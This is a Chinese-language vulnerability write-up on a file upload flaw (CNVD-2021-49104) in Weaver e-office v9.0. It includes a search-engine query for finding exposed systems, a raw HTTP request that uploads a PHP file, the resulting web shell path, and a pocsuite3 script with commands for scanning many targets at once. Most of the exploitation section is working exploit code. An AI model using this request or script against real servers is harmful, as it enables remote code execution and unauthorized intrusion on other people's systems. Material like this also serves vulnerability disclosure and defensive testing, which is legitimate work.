### **简介：**

![1638253075_61a5c213611f9e5b02ef6.png!small?1638253078111](https://image.3001.net/images/20211130/1638253075_61a5c213611f9e5b02ef6.png!small?1638253078111)

泛微e-office系统是标准、易用、快速部署上线的专业协同OA软件,国内协同OA办公领域领导品牌,致力于为企业用户提供专业OA办公系统、移动OA应用等协同OA整体解决方案。

### 漏洞描述

泛微e-office是泛微旗下的一款标准协同移动办公平台。

 **CNVD-2021-49104** 由于 e-office
未能正确处理上传模块中的用户输入，攻击者可以通过该漏洞构造恶意的上传数据包，最终实现任意代码执行。

该漏洞CVSS评分：9.0，危害等级：高危

### 空间搜索引擎

    
    
    app="泛微-EOffice"

### 影响版本：

泛微 e-office v9.0

![1638253109_61a5c2356cd0d241071e0.png!small?1638253111064](https://image.3001.net/images/20211130/1638253109_61a5c2356cd0d241071e0.png!small?1638253111064)

### 漏洞复现

漏洞地址：

POC

    
    
    POST /general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId= HTTP/1.1
    Host: 127.0.0.1:7899
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
    Accept-Encoding: gzip, deflate
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Connection: close
    Accept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6
    Cookie: LOGIN_LANG=cn; PHPSESSID=0acfd0a2a7858aa1b4110eca1404d348
    Content-Length: 193
    Content-Type: multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4
    
    --e64bdf16c554bbc109cecef6451c26a4
    Content-Disposition: form-data; name="Filedata"; filename="test.php"
    Content-Type: image/jpeg
    
    <?php phpinfo();?>
    
    --e64bdf16c554bbc109cecef6451c26a4--
![](https://image.3001.net/images/20211203/1638498375_61a98047e5f531516c312.png!small)

上传后访问shell路径：

    
    
    /images/logo/logo-eoffice.php

![](https://image.3001.net/images/20211203/1638498591_61a9811f324a296b04997.png!small)

### burpsuit3检测脚本

    
    
    # -*- coding:utf-8 -*-    
    from pocsuite3.api import Output, POCBase, register_poc, requests, logger
    from pocsuite3.api import get_listener_ip, get_listener_port
    from pocsuite3.api import REVERSE_PAYLOAD
    from urllib.parse import urljoin
    from pocsuite3.lib.utils import random_str
    
    
    class DemoPOC(POCBase):
        vulID = "CNVD-2021-49104"
        version ='泛微 e-office v9.0'
        author = ["HADESI"]
        vulDate = "2020-12-15"
        createDate = "2021-11-30"
        updateDate = "2021-11-30"
        references =["https://nosec.org/home/detail/4910.html"]
        name ="泛微E-Office文件上传漏洞（CNVD-2021-49104）"
        appPowerLink = ''
        appName = '泛微E-Office'
        appVersion = 'v9.0'
        vulType = 'VUL_TYPE.UPLOAD_FILES '
        desc = '''
        泛微E-Office文件上传漏洞
        '''
        samples = []
        install_requires = ['']
    
        def _verify(self):
            result ={}
            path ="/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId="
            headers={'Content-Type': 'multipart/form-data; boundary=123123'}
            url = urljoin(self.url, path)
            data='''
    --123123
    Content-Disposition: form-data; name="Filedata"; filename="1.php"
    Content-Type: image/jpeg
    
    <?php 
    phpinfo();
    ?>
    
    --123123--'''
            try:
                rr = requests.post(url=url,headers=headers,data=data,timeout=5)
                resq_results=requests.get(url=self.url+'/images/logo/logo-eoffice.php')
                if "System" in resq_results.text:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = url
                    result['VerifyInfo']['path'] = self.url+'/images/logo/logo-eoffice.php'
                    #result['VerifyInfo']['Name'] = payload
            except Exception as e:
                pass
            return self.parse_output(result)
    
        def parse_output(self, result):
            output = Output(self)
            if result:
                output.success(result)
            else:
                output.fail('target is not vulnerable')
            return output
    
        def _attack(self):
            return self._verify()
    register_poc(DemoPOC)

单个检测：python cli.py -r pocs\2021\e-cology\20211202_WEB_E-Office_FileUpload.py
-u http://ip:port --verify

批量检测：python cli.py -r pocs\2021\e-cology\20211202_WEB_E-Office_FileUpload.py
-f 1.txt --verify

###

###

